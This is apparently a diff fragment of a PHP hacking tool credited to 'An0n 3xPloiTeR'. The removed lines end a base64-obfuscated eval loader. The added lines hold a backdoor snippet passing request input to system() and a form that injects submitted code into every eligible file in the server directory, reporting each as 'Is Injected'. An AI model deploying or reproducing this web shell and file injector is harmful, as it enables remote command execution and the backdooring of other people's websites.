Z2tKQ1Q4K0RRb0pDVHd2WkdsMlBqeGljajQ4WW5JK1BHSnlQanhpY2o0TkNna0pQR1JwZGlCamJHRnpjejBpWm05dmRHVnlJajROQ2drSkNUeG1iMjkwWlhJK0RRb0pDUWs4YUhJK0RRb0pDUWs4Wm05dWRENUVaWFpsYkc5d1pXUWdRbmtnUEdFZ2FISmxaajBpYUhSMGNITTZMeTkzZDNjdVoyOXZaMnhsTG1OdmJTOXpaV0Z5WTJnL2NUMUJiakJ1SURONFVHeHZhVlJsVWlJZ2RHRnlaMlYwUFNKZllteGhibXNpUGtGdU1HNGdNM2hRYkc5cFZHVlNQQzloUGp3dlptOXVkRDQ4TDJadmIzUmxjajROQ2drSkNUeG9jajROQ2drSlBDOWthWFkrRFFvSlBDOWliMlI1UGcwS1BDOW9kRzFzUGc9PQ%253D%253D";
-eval(htmlspecialchars_decode(urldecode(base64_decode($UeXploiT))));
-exit;
-?>
+if (isset($_REQUEST[cmd])) {
+system ($_REQUEST[cmd]);
+}
+?>';
+			?>
+				<textarea type="text" name="code" rows="13" cols="80" placeholder="Enter Your Code Like This : <?php echo $console; ?>"></textarea><br>
+				<input style="font-family: Comic Sans Ms; font-size: 90%;" type="submit" name="submit" value="Submit" />
+			</form>
+		</div>
+		<div class="phpresults"><br>
+			<?php
+				if (isset($_POST['submit'])) {
+					$code = $_POST['code'];
+					$code1 = base64_encode($code);
+					$path = getcwd();
+					$host = 'http://'.$_SERVER['HTTP_HOST'];
+					$path_of_file = $_SERVER['SCRIPT_NAME'];
+					$website_testing = $host.$path_of_file;
+					$path = getcwd();
+					$directory = $path;
+
+					if (empty($code)) {
+						echo '<font size=\'50%\' face=\'cursive\' color=\'red\'>You need to input something !!! :P</font>';
+					}
+
+					if (!empty($code)) {
+
+							if ($handle = opendir($directory)) {
+							echo 'Website: '.$website_testing.'<br /><br />';
+							echo 'Looking in '.$directory.'<br>';
+							while ($files = readdir($handle)) {
+								if ($files != '.' && $files != '..' && $files != 'rev.php' && $files != 'REV.php' && $files != '.htaccess' && $files != 'php.ini' && $files != 'admin' && $files != 'images' && $files != 'image' && $files != 'img' && $files != 'phpmyadmin' && $files != 'files' && $files != '.ftpquota' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'xml' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'jpg' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'ico' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'png' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'jpeg' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'txt' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'exe' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'html' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'shtml' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'htm' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'ico' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'css' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'zip' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'sql' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'js' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'py' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'pl' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'md' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'gif') {
+								echo '<a target="_blank" href="'.$files.'">'.$files.'</a><font size="" color="lawngreen" face="cursive">&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
+								$file_data = base64_decode($code1);
+								$file_data .= file_get_contents($files);
+								file_put_contents($files, $file_data);
+								} 
+							}
+						}
+					}
+				}	
+			?>
+		</div><br><br><br><br>
+		<div class="footer">
+			<footer>
+			<hr>
+			<font>Developed By <a href="https://www.google.com/search?q=An0n 3xPloiTeR" target="_blank">An0n 3xPloiTeR</a></font></footer>
+			<hr>
+		</div>
+	</body>
+</html>
